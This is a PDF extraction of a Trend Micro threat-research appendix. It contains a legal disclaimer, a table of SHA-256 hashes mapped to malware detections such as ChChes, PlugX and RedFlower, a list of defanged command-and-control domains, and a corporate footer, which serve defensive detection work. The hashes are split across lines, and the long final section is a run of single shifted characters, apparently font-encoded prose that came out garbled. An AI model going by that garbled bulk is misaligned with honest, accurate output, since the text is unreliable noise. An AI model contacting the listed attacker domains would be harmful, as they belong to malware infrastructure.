["      \u00be\n>\u00f6\ufb02\n ", "Trend\nLabs\n \n \n \n \n \n TREND MICRO LEGAL DISCLAIMER\n \nThe information provided herein is for general information and educational purposes only. It is not intended and should not b\ne construed to constitute legal \nadvice. The information contained herein may not be \napplicable to all situations and may not reflect the most current situation. Nothing contained herein should \nbe relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and \nnothing herein should \nbe construed \notherwise. Trend Micro reserves the right to modify the contents of this document at any time without prior notice.\n \nTranslations of any material into other languages are intended solely as a convenience. Translation accuracy is not guarantee\nd \nnor implied. If any questions arise \nrelated to the accuracy of a translation, please refer to the original language official version of the document. Any discrep\nancies or differences created in the \ntranslation are not binding and have no legal effect for c\nompliance or enforcement purposes.\n \nAlthough Trend Micro uses reasonable efforts to include accurate and up\n-\nto\n-\ndate information herein, Trend Micro makes no warranties or representations of any \nkind as to its accuracy, currency, or completeness. You agree \nthat access to and use of and reliance on this document and the content thereof is at your own \nrisk. Trend Micro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in cre\nating, producing, or delivering this\n \ndocument shall be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of bu\nsiness profits, or special damages, \nwhatsoever arising out of access to, use of, or inability to use, or in connection with the us\ne of this document, or any errors or omissions in the content thereof. \n\n \n \n \n \n \n \n \n \n  \n \n \n \n \nSHA\n-\n256\n \nDetection\n \nae6b45a92384f6e43672e617c53a44225e29\n44d66c1ffb074694526386074145\n \nBKDR_CHCHES.NAK\n \n2c71eb5c781daa43047fa6e3d85d51a061aa\n1dfa41feb338e0d4139a6dfd6910\n \nBKDR_CHCHES.NAM\n \ne7c617e162c2ae173c3581b4e08d752dc421\n336e1e55d879642717b75745d49c\n \nBKDR_CHCHES.NAO\n \n6605b27e95f5c3c8012e4a75d1861786fb749\nb9a712a5f4871adbad81addb59e\n \nBKDR_CHCHES.SM2\n \nc885a4f5c066b00e9d4de8cc0f5463f27ce49\n869519db8cfdc7a9ae19cdce4f0\n \nBKDR_CHCHES.SM2\n \nefa0b414a831cbf724d1c67808b7483dec22a\n981ae670947793d114048f88057\n \nBKDR_CHCHES.SM2\n \nfadf362a52dcf884f0d41ce3df9eaa9bb30227\nafda50c0e0657c096baff501f0\n \nBKDR_CHCHES.SM2\n \n4ff6a97d06e2e843755be8697f3324be36e1e\nbeb280bb45724962ce4b6710297\n \nBKDR_CHCHES.SMZJEA\n-\nA\n \n75ef6ea0265d2629c920a6a1c0d1dd91d3c0\neda86445c7d67ebb9b30e35a2a9f\n \nBKDR_CHCHES.SMZJEA\n-\nA\n \n590d5e0858893951e22e392a7dad76b30765\nc8fd139ca288efeead9b86836237\n \nBKDR_CHCHES.SMZKDJ\n-\nB\n \n2965c1b6ab9d1601752cb4aa26d64a444b0a\n535b1a190a70d5ce935be3f91699\n \nBKDR_CHCHES.SMZKDJ\n-\nC\n \n4521a74337a8b454f9b80c7d9e57b4c95805\n67f84e513d9a3ce763275c55e691\n \nBKDR_CHCHES.SMZKDJ\n-\nC\n \nc21eaadf9ffc62ca4673e27e06c16447f103c0\ncf7acd8db6ac5c8bd17805e39d\n \nBKDR_CHCHES.SMZKDJ\n-\nC\n \ncb0c8681a407a76f8c0fd2512197aafad8120\naa62e5c871c29d1fd2a102bc628\n \nBKDR_CHCHES.SMZKDJ\n-\nC\n \nd26dae0d8e5c23ec35e8b9cf126cded45b80\n96fc07560ad1c06585357921eeed\n \nBKDR_C\nHCHES.SMZKDJ\n-\nC\n \ne6ecb146f469d243945ad8a5451ba1129c5b\n190f7d50c6458\n0dbad4b8246f88e\n \nBKDR_CHCHES.SMZKDJ\n-\nC\n \n94813a9097833ca793a02a33d06cf78ff2555\n8e516527aa8cfde7b7f62cdc9d9\n \nBKDR_CHCHES.SMZLEC\n-\nA\n \nae30e854a2fb49da770666df78db3983cd3a8\n3774a0fe19d0f98a9ca450d1bd3\n \nBKDR_CHCHES.SMZLEC\n-\nA\n \n2933bd208993fb7ec76ae3f55d2e7959c0a79\nd89f134430c6a798e82ebd94636\n \nBKDR_CHCHES.YO\n \n316e89d866d5c710530c2103f183d86c31e9\na90d55e2ebc2dda94f112f3bdb6d\n \nBKDR_CHCHES.ZJDK\n-\nA\n \ne90064884190b14a6621c18d1f9719a37b9e\n5f98506e28ff0636438e3282098b\n \nBKDR_CHCHES.ZJDK\n-\nA\n \n  \n \n \n \n \nSHA\n-\n256\n \nDetection\n \n72d7bcc54520a7d8929eeec78e2b2297a909\n4fa001483f86cddb7cf1b81704ff\n \nBKDR_CHCHES.ZJEH\n \ne88f5bf4be37e0dc90ba1a06a2d47faaeea90\n47fec07c17c2a76f9f7ab98acf0\n \nBKDR_CHCHES.ZLDK\n-\nB\n \n759e405351e6de779757695cc6fb1bce3cc6\ne3bb3ee4d24778d0cb2070091681\n \nBKDR_PLUGX.BHS\n \n2ddcb1dc466e22388485118bcf3089014348\n881c4d315aca452c6bb44b6c7bee\n \nBKDR_PLUGX.JKK\n \nf6ba0007038805fdc9e92ccbfed5f4cc681723\nbb548cc83a4b34f754f3356974\n \nBKDR_PLUGX.ZKEG\n-\nA\n \n1ac2134ef1ca208b3d236b387a8d3256ce6fc\ncc0419947b77a9b671b6eba52bf\n \nBKDR_REDFLOWER.ZBEE\n-\nA\n \nc082d5bc76eb8375a90b622474da760bd49\n9ae8371c16cc31085be2940b0bafb\n \nBKDR_REDFLOWER.ZBEE\n-\nA\n \nf9f2b38e11402b56fe05127bf0e688d74bb6e\n55834b93b7a0f6c61174670177a\n \nBKDR_TINYX.\nZKEG\n \n5961861d2b9f50d05055814e6bfd1c6291b3\n0719f8a4d02d4cf80c2e87753fa1\n \nTROJ_BLOCKER.ASK\n \n9a6692690c03ec33c758cb5648be1ed886ff0\n39e6b72f1c43b23fbd9c342ce8c\n \nTROJ_FAKEMS.USPO\n \n58a7670111087243516b601c5f070f7de0db5\n411febe0a878783fdc17c969a59\n \nTROJ_INJECTR.ZJDK\n-\nA\n \nb20ce00a6864225f05de6407fac80ddb83cd0\naec00ada438c1e354cdd0d7d5df\n \nTROJ_INJECTR.ZJDK\n-\nC\n \nf251485a62e104dfd8629dc4d2dfd572ebd0a\nb554602d682a28682876a47e773\n \nTROJ_INJECTR.ZJDK\n-\nD\n \n19aa5019f3c00211182b2a80dd9675721dac\n7cfb31d174436d3b8ec9f97d898b\n \nTROJ_INJECTR.ZKDJ\n-\nA\n \n5c6c2370090d68d2d3120cec62984767ae0f\nc93766939d159a2f4c482f58ae5b\n \nTROJ_INJECTR.ZKDJ\n-\nB\n \n312dc69dd6ea16842d6e58cd7fd98ba4d28e\nefeb4fd4c4d198fac4eee76f93c3\n \nTROJ_INJECTR.ZKDJ\n-\nC\n \nbc2f07066c624663b0a6f71cb965009d4d9b\n480213de51809cdc454ca55f1a91\n \nTROJ_INJECTR.ZLDK\n-\nA\n \nfd6a956a7708708cddff78c8505c7db73d7c4\ne961da8a3c00cc5a51171a92b7b\n \nTROJ_PASTEAL.JV\n \n73794263b657632805c8c3907e2f20a9743d\n8c9b83aa3e21629eccc5de02b1ca\n \nTROJ_PASTEAL.JV\n \n45d804f35266b26bf63e3d616715fc593931e\n33aa07feba5ad6875609692efa2\n \nTROJ_PLUGX.DUKPT\n \n \n \n \n  \n \n \n \n \n \nDomains\n \narea[.]\nwthelpdesk\n[.]\ncom\n \ndick\n[.]\nccfchrist\n[.]\ncom\n \nfiveavmersi\n[.]\nwebsegoo\n[.]\nnet\n \nfukuoka\n[.]\ncloud\n-\nmaste\n[.]\ncom\n \nkawasak\n[.]\ncloud\n-\nmaste\n[.]\ncom\n \nkawasaki\n[.]\nunhamj\n[.]\ncom\n \nmessagea\n[.]\nemailfound\n[.]\ninfo\n \nsakai\n[.]\nunhamj\n[.]\ncom\n \nscorpion\n[.]\npoulsenv\n[.]\ncom\n \nshrimp\n[.]\nbdoncloud\n[.]\ncom\n \ntrout\n[.]\nbelowto\n[.]\ncom\n \nwhale\n[.]\ntoshste\n[.]\ncom\n \nzebra\n[.]\nwthelpdesk\n[.]\ncom\n \n \n \n \n  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nTrend Micro Incorporated, a global leader in security \nsoftware, strives to make the \nworld safe for exchanging digital information. Our innovative solutions for consumers, \nbusinesses and governments provide layered content security to protect information \non mobile devices, endpoints, gateways, servers and the \ncloud. All of our solutions \nare powered by cloud\n-\n\n\nglobe. For more information, visit\n \nwww.trendmicro.com\n. \n \n\u00a9201\n7\n \nby Trend \nMicro, Incorporated. All rights reserved. Trend Micro and the Trend \nMicro t\n-\nball logo are trademarks or registered trademarks of Trend Micro, \nIncorporated. All other product or company names may be trademarks or registered \ntrademarks of their owners.\n \n ", "l\n\u00fc\n     ", "2\nS\nH\nU\nD\nW\nL\nR\nQ\n.\nL\nQ\nJ\nS\nK\nL\nV\nK\n\u02db\n8\nQ\nF\nR\nY\nH\nU\nL\nQ\nJ\nD\n&\nD\nP\nS\nD\nL\nJ\nQ\nR\nI\n&\n\\\nE\nH\nU\n$\nW\nW\nD\nF\nN\nV\nD\nJ\nD\nL\nQ\nV\nW\n&\nL\nY\nL\nO\n6\nR\nF\nL\nH\nW\n\\\nL\nQ\n4\nD\nW\nD\nU\nD\nQ\nG\nb\n1\nH\nS\nD\nO\n0\nW\nF\nS\nU\nI\nF\nD\nP\nV\nS\nT\nF\nP\nG\n\u2022\nB\nO\nE\nQ\nB\nS\nU\nJ\nD\nV\nM\nB\nS\nM\nZ\nJ\nO\nU\nF\nO\nT\nJ\nG\nZ\nJ\nO\nH\nU\nP\nX\nB\nS\nE\nT\nU\nI\nF\nF\nO\nE\nP\nG\nU\nI\nF\nZ\nF\nB\nS\n\u2022\nT\nF\nW\nF\nS\nB\nM\nJ\nO\nE\nJ\nW\nJ\nE\nV\nB\nM\nT\nL\nO\nP\nX\nO\nU\nP\n\"\nN\nO\nF\nT\nU\nZ\n*\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nX\nF\nS\nF\nB\nQ\nQ\nS\nP\nB\nD\nI\nF\nE\nW\nJ\nB\nF\nN\nB\nJ\nM\nB\nO\nE\nU\nI\nS\nP\nV\nH\nI\nT\nP\nD\nJ\nB\nM\nN\nF\nE\nJ\nB\nC\nZ\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nT\nF\nF\nN\nJ\nO\nH\nM\nZ\nB\nO\nF\nO\nU\nI\nV\nT\nJ\nB\nT\nU\nJ\nD\nB\nD\nU\nJ\nW\nJ\nT\nU\nX\nJ\nU\nI\nB\nT\nU\nS\nP\nO\nH\nJ\nO\nU\nF\nS\nF\nT\nU\nJ\nO\nI\nV\nN\nB\nO\nS\nJ\nH\nI\nU\nT\n8\nI\nB\nU\nM\nJ\nF\nE\nC\nF\nO\nF\nB\nU\nI\nU\nI\nJ\nT\nG\nB\nD\nB\nE\nF\nX\nB\nT\nB\nX\nF\nM\nM\nF\nO\nH\nJ\nO\nF\nF\nS\nF\nE\nD\nB\nN\nQ\nB\nJ\nH\nO\nP\nG\nQ\nI\nJ\nT\nI\nJ\nO\nH\nB\nU\nU\nB\nD\nL\nT\nE\nF\nT\nJ\nH\nO\nF\nE\nU\nP\nT\nU\nF\nB\nM\nD\nS\nF\nE\nF\nO\nU\nJ\nB\nM\nT\nB\nO\nE\nT\nQ\nZ\nP\nO\nU\nI\nF\nB\nD\nU\nJ\nW\nJ\nU\nZ\nP\nG\nE\nP\n[\nF\nO\nT\nP\nG\nK\nP\nV\nS\nO\nB\nM\nJ\nT\nU\nT\nI\nV\nN\nB\nO\nS\nJ\nH\nI\nU\nT\nE\nF\nG\nF\nO\nE\nF\nS\nT\nU\nS\nB\nE\nF\nV\nO\nJ\nP\nO\nT\nB\nO\nE\nM\nB\nC\nP\nV\nS\nS\nJ\nH\nI\nU\nT\nB\nD\nU\nJ\nW\nJ\nT\nU\nT\nN\nB\nO\nZ\nP\nG\nX\nI\nP\nN\nB\nS\nF\nT\nF\nF\nN\nJ\nO\nH\nM\nZ\nJ\nO\nW\nP\nM\nW\nF\nE\nJ\nO\nU\nI\nF\nJ\nT\nT\nV\nF\nP\nG\nN\nJ\nH\nS\nB\nO\nU\nT\nS\nJ\nH\nI\nU\nT\nJ\nO\n2\nB\nU\nB\nS\nB\nO\nE\n/\nF\nQ\nB\nM\n0\nV\nS\nJ\nO\nW\nF\nT\nU\nJ\nH\nB\nU\nJ\nP\nO\nP\nG\nU\nI\nF\nB\nU\nU\nB\nD\nL\nT\nE\nJ\nE\nO\nU\nZ\nJ\nF\nM\nE\nB\nO\nZ\nF\nW\nJ\nE\nF\nO\nD\nF\nU\nI\nB\nU\nX\nP\nV\nM\nE\nJ\nO\nE\nJ\nD\nB\nU\nF\nU\nI\nF\nD\nP\nO\nD\nM\nV\nT\nJ\nW\nF\nS\nF\nT\nQ\nP\nO\nT\nJ\nC\nJ\nM\nJ\nU\nZ\nP\nG\nB\nQ\nB\nS\nU\nJ\nD\nV\nM\nB\nS\nH\nP\nW\nF\nS\nO\nN\nF\nO\nU\nB\nM\nU\nI\nP\nV\nH\nI\nX\nF\nT\nV\nT\nQ\nF\nD\nU\nU\nI\nF\nT\nF\nB\nU\nU\nB\nD\nL\nT\nN\nJ\nH\nI\nU\nI\nB\nW\nF\nC\nF\nF\nO\nP\nS\nD\nI\nF\nT\nU\nS\nB\nU\nF\nE\nC\nZ\nB\nT\nU\nB\nU\nF\nB\n\u00d3\nM\nJ\nB\nU\nF\nE\nB\nD\nU\nP\nS\n8\nF\nS\nF\nG\nF\nS\nU\nP\nU\nI\nJ\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\nB\nO\nE\nU\nI\nF\nB\nT\nT\nP\nD\nJ\nB\nU\nF\nE\nB\nD\nU\nP\nS\nB\nT\n0\nQ\nF\nS\nB\nU\nJ\nP\nO\n,\nJ\nO\nH\nQ\nI\nJ\nT\nI\nh\n.\nB\nM\nJ\nL\nv\nJ\nO\nP\nO\nF\nP\nG\nJ\nU\nT\nX\nS\nJ\nU\nU\nF\nO\nG\nP\nS\nN\nT\nJ\nO\n\"\nS\nB\nC\nJ\nD\nU\nS\nB\nO\nT\nM\nB\nU\nF\nT\nU\nP\nh\n,\nJ\nO\nH\nv\n*\nU\nJ\nT\nX\nP\nS\nU\nI\nO\nP\nU\nJ\nO\nH\nU\nI\nB\nU\nJ\nO\n%\nF\nD\nF\nN\nC\nF\nS\n\"\nN\nO\nF\nT\nU\nZ\n*\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nQ\nV\nC\nM\nJ\nT\nI\nF\nE\nB\nO\nJ\nO\nW\nF\nT\nU\nJ\nH\nB\nU\nJ\nP\nO\nJ\nO\nU\nP\nB\nO\nP\nU\nI\nF\nS\nT\nP\nD\nJ\nB\nM\nF\nO\nH\nJ\nO\nF\nF\nS\nJ\nO\nH\nD\nB\nN\nQ\nB\nJ\nH\nO\nQ\nF\nS\nQ\nF\nU\nS\nB\nU\nF\nE\nC\nZ\nB\nT\nF\nF\nN\nJ\nO\nH\nM\nZ\nG\nB\nL\nF\nI\nV\nN\nB\nO\nS\nJ\nH\nI\nU\nT\nP\nS\nH\nB\nO\nJ\n[\nB\nU\nJ\nP\nO\nL\nO\nP\nX\nO\nB\nT\n7\nP\nJ\nD\nF\nM\nF\nT\nT\n7\nJ\nD\nU\nJ\nN\nT\nX\nI\nJ\nD\nI\nU\nB\nS\nH\nF\nU\nF\nE\nJ\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nI\nV\nN\nB\nO\nS\nJ\nH\nI\nU\nT\nB\nO\nE\nM\nB\nC\nP\nV\nS\nS\nJ\nH\nI\nU\nT\nP\nS\nH\nB\nO\nJ\n[\nB\nU\nJ\nP\nO\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\nJ\nO\nH\nP\nO\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nS\nJ\nH\nI\nU\nT\nJ\nO\n2\nB\nU\nB\nS\n8\nI\nJ\nM\nF\nU\nI\nF\nS\nF\nJ\nT\nB\nD\nM\nF\nB\nS\nB\nM\nJ\nH\nO\nN\nF\nO\nU\nP\nG\nJ\nO\nU\nF\nS\nF\nT\nU\nT\nX\nF\nI\nB\nW\nF\nG\nP\nV\nO\nE\nO\nP\nF\nW\nJ\nE\nF\nO\nD\nF\nU\nP\nT\nV\nH\nH\nF\nT\nU\nU\nI\nF\nT\nF\nU\nX\nP\nD\nB\nN\nQ\nB\nJ\nH\nO\nT\nB\nS\nF\nE\nJ\nS\nF\nD\nU\nM\nZ\nD\nP\nO\nO\nF\nD\nU\nF\nE\n0\nL\nJ\nU\nD\nQ\nW\nV\n\u00c9\nU\nL\nJ\nK\nW\nV\nL\nQ\nb\n4\nD\nW\nD\nU\n.\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nN\nB\nJ\nO\nM\nZ\nG\nS\nP\nN\n4\nP\nV\nU\nI\n\"\nT\nJ\nB\nD\nP\nN\nQ\nS\nJ\nT\nF\nN\nP\nS\nF\nU\nI\nB\nO\n\u02c6\nP\nG\n2\nB\nU\nB\nS\nT\nX\nP\nS\nL\nG\nP\nS\nD\nF\nX\nJ\nU\nI\n/\nF\nQ\nB\nM\nJ\nT\nC\nF\nJ\nO\nH\nP\nO\nF\nP\nG\nU\nI\nF\nM\nB\nS\nH\nF\nT\nU\nO\nB\nU\nJ\nP\nO\nB\nM\nJ\nU\nJ\nF\nT\n5\nI\nF\nF\nY\nQ\nM\nP\nJ\nU\nB\nU\nJ\nP\nO\nP\nG\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nJ\nO\n2\nB\nU\nB\nS\nQ\nB\nS\nU\nJ\nD\nV\nM\nB\nS\nM\nZ\nJ\nO\nU\nI\nF\nD\nP\nO\nT\nU\nS\nV\nD\nU\nJ\nP\nO\nT\nF\nD\nU\nP\nS\nI\nB\nT\nC\nF\nF\nO\nX\nJ\nE\nF\nM\nZ\nS\nF\nQ\nP\nS\nU\nF\nE\nP\nO\nT\nJ\nO\nD\nF\n2\nB\nU\nB\nS\nX\nP\nO\nU\nI\nF\nS\nJ\nH\nI\nU\nU\nP\nI\nP\nT\nU\nU\nI\nF\n8\nP\nS\nM\nE\n$\nV\nQ\n5\nI\nF\nT\nQ\nP\nO\nT\nP\nS\nT\nI\nJ\nQ\nT\nZ\nT\nU\nF\nN\nX\nI\nJ\nD\nI\nU\nJ\nF\nT\n N\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nU\nP\nU\nI\nF\nJ\nS\nF\nN\nQ\nM\nP\nZ\nF\nS\nT\nI\nB\nT\nC\nF\nF\nO\nX\nJ\nE\nF\nM\nZ\nD\nS\nJ\nU\nJ\nD\nJ\n[\nF\nE\nB\nT\nC\nF\nJ\nO\nH\nB\nN\nB\nK\nP\nS\nE\nS\nJ\nW\nF\nS\nP\nG\nF\nY\nQ\nM\nP\nJ\nU\nB\nU\nJ\nP\nO\n\"\nT\n\"\nN\nO\nF\nT\nU\nZ\n*\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nS\nF\nQ\nP\nS\nU\nF\nE\nS\nF\nD\nF\nO\nU\nD\nI\nB\nO\nH\nF\nT\nU\nP\nM\nB\nX\nT\nH\nP\nW\nF\nS\nO\nJ\nO\nH\nU\nI\nF\nN\nJ\nH\nS\nB\nO\nU\nM\nB\nC\nP\nV\nS\nT\nZ\nT\nU\nF\nN\nJ\nO\n2\nB\nU\nB\nS\nC\nB\nS\nF\nM\nZ\nT\nD\nS\nB\nU\nD\nI\nU\nI\nF\nT\nV\nS\nG\nB\nD\nF\nP\nG\nU\nI\nF\nQ\nS\nP\nC\nM\nF\nN\nB\nO\nE\nD\nP\nO\nU\nJ\nO\nV\nF\nU\nP\nM\nF\nB\nW\nF\nN\nJ\nH\nS\nB\nO\nU\nX\nP\nS\nL\nF\nS\nT\nJ\nO\nD\nM\nV\nE\nJ\nO\nH\nU\nI\nP\nT\nF\nC\nV\nJ\nM\nE\nJ\nO\nH\nT\nU\nB\nE\nJ\nV\nN\nT\nB\nO\nE\nJ\nO\nG\nS\nB\nT\nU\nS\nV\nD\nU\nV\nS\nF\nG\nP\nS\nU\nI\nF\n8\nP\nS\nM\nE\n$\nV\nQ\nB\nU\nU\nI\nF\nN\nF\nS\nD\nZ\nP\nG\nF\nY\nQ\nM\nP\nJ\nU\nB\nU\nJ\nW\nF\nC\nP\nT\nT\nF\nT\nB\nO\nE\nB\nU\nS\nJ\nT\nL\nP\nG\nT\nF\nS\nJ\nP\nV\nT\nI\nV\nN\nB\nO\nS\nJ\nH\nI\nU\nT\nB\nC\nV\nT\nF\nT\nJ\nO\nD\nM\nV\nE\nJ\nO\nH\nG\nP\nS\nD\nF\nE\nM\nB\nC\nP\nV\nS\n8\nP\nS\nL\nF\nS\nT\nT\nU\nJ\nM\nM\nS\nF\nR\nV\nJ\nS\nF\nF\nY\nJ\nU\nQ\nF\nS\nN\nJ\nU\nT\nU\nP\nM\nF\nB\nW\nF\nU\nI\nF\nD\nP\nV\nO\nU\nS\nZ\nX\nI\nJ\nD\nI\nD\nB\nO\nT\nU\nJ\nM\nM\nC\nF\nC\nM\nP\nD\nL\nF\nE\nC\nZ\nU\nI\nF\nJ\nS\nF\nN\nQ\nM\nP\nZ\nF\nS\nB\nO\nE\nF\nN\nQ\nM\nP\nZ\nF\nS\nT\nD\nB\nO\nO\nP\nX\nM\nF\nH\nB\nM\nM\nZ\nL\nF\nF\nQ\nI\nP\nM\nE\nP\nG\nU\nI\nF\nJ\nS\nX\nP\nS\nL\nF\nS\nT\nQ\nB\nT\nT\nQ\nP\nS\nU\nT\nV\nO\nE\nF\nS\nB\nO\nF\nX\nM\nP\nP\nQ\nI\nP\nM\nF\nX\nI\nJ\nD\nI\nD\nB\nO\nC\nF\nF\nB\nT\nJ\nM\nZ\nF\nY\nQ\nM\nP\nJ\nU\nF\nE\n\u00cb\n6\nD\nI\nH\nH\nQ\nD\n0\nD\nO\nL\nN\n\u00cc\nS\nK\nL\nV\nK\nL\nQ\nJ\nH\n[\nS\nH\nG\nL\nW\nL\nR\nQ\n<\nR\nX\n7\nX\nE\nH\n /\nP\nU\nF\n\u02d9\nU\nI\nS\nP\nV\nH\nI\nP\nV\nU\nU\nI\nF\nS\nF\nQ\nP\nS\nU\nX\nF\nI\nB\nW\nF\nS\nF\nE\nB\nD\nU\nF\nE\nX\nI\nF\nS\nF\nO\nF\nD\nF\nT\nT\nB\nS\nZ\nO\nB\nN\nF\nT\nB\nO\nE\nF\nN\nB\nJ\nM\nB\nE\nE\nS\nF\nT\nT\nF\nT\nP\nG\nJ\nO\nE\nJ\nW\nJ\nE\nV\nB\nM\nT\nB\nO\nE\nP\nS\nH\nB\nO\nJ\n[\nB\nU\nJ\nP\nO\nT\nU\nB\nS\nH\nF\nU\nF\nE\nJ\nO\nP\nS\nE\nF\nS\nU\nP\nQ\nS\nP\nU\nF\nD\nU\nU\nI\nF\nJ\nS\nJ\nE\nF\nO\nU\nJ\nU\nZ\nB\nO\nE\nT\nB\nG\nF\nU\nZ\n8\nF\nI\nB\nW\nF\nB\nM\nT\nP\nP\nC\nT\nD\nV\nS\nF\nE\nX\nI\nF\nS\nF\nW\nF\nS\nQ\nP\nT\nT\nJ\nC\nM\nF\nU\nI\nF\nQ\nJ\nD\nU\nV\nS\nF\nT\nV\nU\nJ\nM\nJ\n[\nF\nE\nC\nZ\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nP\nO\nU\nI\nF\nG\nB\nL\nF\nT\nP\nD\nJ\nB\nM\nN\nF\nE\nJ\nB\nQ\nS\nP\nl\nM\nF\nT\nB\nT\nU\nI\nF\nZ\nI\nB\nW\nF\nC\nF\nF\nO\nM\nJ\nL\nF\nM\nZ\nT\nU\nP\nM\nF\nO\nG\nS\nP\nN\nQ\nF\nP\nQ\nM\nF\nX\nJ\nU\nI\nO\nP\nJ\nO\nW\nP\nM\nW\nF\nN\nF\nO\nU\nJ\nO\nU\nI\nF\nT\nF\nB\nU\nU\nB\nD\nL\nT\n0\nV\nS\nJ\nO\nW\nF\nT\nU\nJ\nH\nB\nU\nJ\nP\nO\nS\nF\nW\nF\nB\nM\nF\nE\nU\nI\nB\nU\nV\nO\nJ\nE\nF\nO\nU\nJ\nl\nF\nE\nB\nU\nU\nB\nD\nL\nF\nS\nT\nI\nB\nW\nF\nQ\nV\nS\nQ\nP\nT\nF\nG\nV\nM\nM\nZ\nD\nS\nF\nB\nU\nF\nE\nB\nO\nE\nN\nB\nJ\nO\nU\nB\nJ\nO\nF\nE\nX\nI\nB\nU\nB\nQ\nQ\nF\nB\nS\nT\nU\nP\nC\nF\nB\nG\nB\nL\nF\nP\nO\nM\nJ\nO\nF\nQ\nF\nS\nT\nP\nO\nB\nO\nB\nN\nF\nE\nh\n4\nB\nG\nF\nF\nO\nB\n.\nB\nM\nJ\nL\nv\nJ\nO\nP\nS\nE\nF\nS\nU\nP\nS\nF\nH\nV\nM\nB\nS\nM\nZ\nF\nO\nH\nB\nH\nF\nJ\nO\nD\nP\nO\nW\nF\nS\nT\nB\nU\nJ\nP\nO\nT\nX\nJ\nU\nI\nU\nI\nF\nT\nF\nM\nF\nD\nU\nF\nE\nU\nB\nS\nH\nF\nU\nT\nB\nO\nE\nB\nU\nE\nJ\n\u00d2\nF\nS\nF\nO\nU\nU\nJ\nN\nF\nT\nB\nO\nE\nX\nJ\nU\nI\nE\nJ\n\u00d2\nF\nS\nF\nO\nU\nQ\nS\nF\nU\nF\nO\nT\nF\nT\nU\nS\nZ\nU\nP\nM\nV\nS\nF\nU\nI\nF\nN\nJ\nO\nU\nP\nH\nJ\nW\nJ\nO\nH\nB\nX\nB\nZ\nU\nI\nF\nJ\nS\nD\nS\nF\nE\nF\nO\nU\nJ\nB\nM\nT\nU\nP\nU\nI\nF\nJ\nS\n(\nN\nB\nJ\nM\nB\nD\nD\nP\nV\nO\nU\nU\nI\nS\nP\nV\nH\nI\nU\nI\nF\nV\nT\nF\nP\nG\nQ\nI\nJ\nT\nI\nJ\nO\nH\nB\nU\nU\nB\nD\nL\nT\n1\nI\nJ\nT\nI\nJ\nO\nH\nJ\nT\nB\nI\nB\nD\nL\nJ\nO\nH\nU\nF\nD\nI\nO\nJ\nR\nV\nF\nU\nI\nB\nU\nP\nG\nU\nF\nO\nD\nP\nO\nT\nJ\nT\nU\nT\nP\nG\nN\nJ\nN\nJ\nD\nL\nJ\nO\nH\nQ\nP\nQ\nV\nM\nB\nS\nP\nO\nM\nJ\nO\nF\nT\nF\nS\nW\nJ\nD\nF\nT\nT\nV\nD\nI\nB\nT\n(\nP\nP\nH\nM\nF\n'\nB\nD\nF\nC\nP\nP\nL\n5\nX\nJ\nU\nU\nF\nS\nB\nO\nE\n-\nJ\nO\nL\nF\nE\nJ\nO\nB\nO\nE\nD\nS\nF\nE\nJ\nC\nM\nZ\nS\nF\nQ\nM\nJ\nD\nB\nU\nJ\nO\nH\nU\nI\nF\nJ\nS\nM\nP\nH\nJ\nO\nQ\nB\nH\nF\nT\nX\nJ\nU\nI\nU\nI\nF\nH\nP\nB\nM\nP\nG\nT\nU\nF\nB\nM\nJ\nO\nH\nV\nT\nF\nS\nO\nB\nN\nF\nT\nB\nO\nE\nQ\nB\nT\nT\nX\nP\nS\nE\nT\nG\nS\nP\nN\nU\nI\nF\nE\nF\nT\nJ\nH\nO\nB\nU\nF\nE\nW\nJ\nD\nU\nJ\nN\nT\nC\nZ\nM\nV\nS\nJ\nO\nH\nU\nI\nF\nN\nJ\nO\nU\nP\nN\nJ\nT\nU\nB\nL\nF\nO\nM\nZ\nB\nV\nU\nI\nF\nO\nU\nJ\nD\nB\nU\nJ\nO\nH\nU\nI\nS\nP\nV\nH\nI\nT\nV\nD\nI\nQ\nB\nH\nF\nT\n5\nI\nJ\nT\nU\nZ\nQ\nF\nP\nG\nB\nU\nU\nB\nD\nL\nJ\nT\nF\nY\nU\nS\nF\nN\nF\nM\nZ\nQ\nP\nQ\nV\nM\nB\nS\nB\nO\nE\nP\nG\nU\nF\nO\nV\nT\nF\nE\nB\nH\nB\nJ\nO\nT\nU\nN\nF\nN\nC\nF\nS\nT\nP\nG\nD\nJ\nW\nJ\nM\nT\nP\nD\nJ\nF\nU\nZ\n*\nU\nJ\nT\nS\nF\nM\nB\nU\nJ\nW\nF\nM\nZ\nF\nB\nT\nZ\nB\nO\nE\nD\nI\nF\nB\nQ\nU\nP\nP\nS\nD\nI\nF\nT\nU\nS\nB\nU\nF\nB\nO\nE\nJ\nG\nT\nV\nD\nD\nF\nT\nT\nG\nV\nM\nJ\nU\nH\nS\nB\nO\nU\nT\nU\nI\nF\nB\nU\nU\nB\nD\nL\nF\nS\nT\nB\nD\nD\nF\nT\nT\nU\nP\nW\nJ\nD\nU\nJ\nN\nT\nQ\nF\nS\nT\nP\nO\nB\nM\nB\nO\nE\nQ\nS\nP\nG\nF\nT\nT\nJ\nP\nO\nB\nM\nF\nN\nB\nJ\nM\nB\nD\nD\nP\nV\nO\nU\nT\nX\nI\nJ\nD\nI\nD\nB\nO\nP\nC\nW\nJ\nP\nV\nT\nM\nZ\nS\nF\nW\nF\nB\nM\nW\nF\nS\nZ\nT\nF\nO\nT\nJ\nU\nJ\nW\nF\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\n'\nP\nS\nF\nY\nB\nN\nQ\nM\nF\nI\nB\nW\nJ\nO\nH\nB\nO\nB\nD\nU\nJ\nW\nJ\nT\nU\nT\nF\nN\nB\n